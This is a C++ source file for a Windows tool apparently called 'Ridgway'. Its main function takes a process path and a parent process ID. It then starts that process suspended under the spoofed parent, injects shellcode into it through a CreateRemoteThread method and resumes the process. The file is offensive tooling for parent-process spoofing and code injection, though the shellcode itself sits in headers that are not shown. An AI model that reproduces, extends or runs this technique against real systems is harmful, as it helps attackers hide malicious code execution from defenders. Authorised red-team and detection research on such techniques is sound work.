#include <Windows.h>
#include "stdafx.h"
#include "ParentProcessManipulation.h"
#include "Ridgway.h"
#include "ShellcodeInjection.h"

int CreateRemoteThreadMethod(_TCHAR* processName, int parentProcessId)
{
	// Start the process suspended with the given parent process ID
	PROCESS_INFORMATION processInfo = StartProcessSuspended(processName, parentProcessId);

	if (processInfo.dwProcessId == NULL){ 
		#ifdef DEBUG
			getchar();
		#endif
		return 3;
	}

	// Inject the shellcode
	if (!InjectShellcode(processInfo)) { 
		#ifdef DEBUG
			getchar();
		#endif
		return 4;
	}

	// Resume execution
	if(!ResumeThread(processInfo.hThread))
	{
		DisplayErrorMessage(TEXT("Error resuming thread"), GetLastError());
		#ifdef DEBUG
			getchar();
		#endif
		return 5;
	}
	#ifdef DEBUG
			getchar();
	#endif
	return 0;
}

int _tmain(int argc, _TCHAR* argv[])
{
	if (argc != 3 && argc != 4) 
	{
		_tprintf(TEXT("usage: Ridgway.exe <processPath> <parentProcessId> [injectMethod]\n"));
		_tprintf(TEXT("[injectMethod] is optional:\n"));
		_tprintf(TEXT("1: Use CreateRemoteThread\n"));
		_tprintf(TEXT("2: WIP\n"));
		return 1;
	}

	int parentProcessId = _tstoi(argv[2]);
	int injectMethod = 1;
	if(argc == 4)
	{
		injectMethod = _tstoi(argv[3]);
	}

	switch (injectMethod)
	{
		case 1:
			return CreateRemoteThreadMethod(argv[1], parentProcessId);
	
		default:
			_tprintf(TEXT("Unrecognised or unsupported option: %d"), injectMethod);
			return 2;
	}
	

}




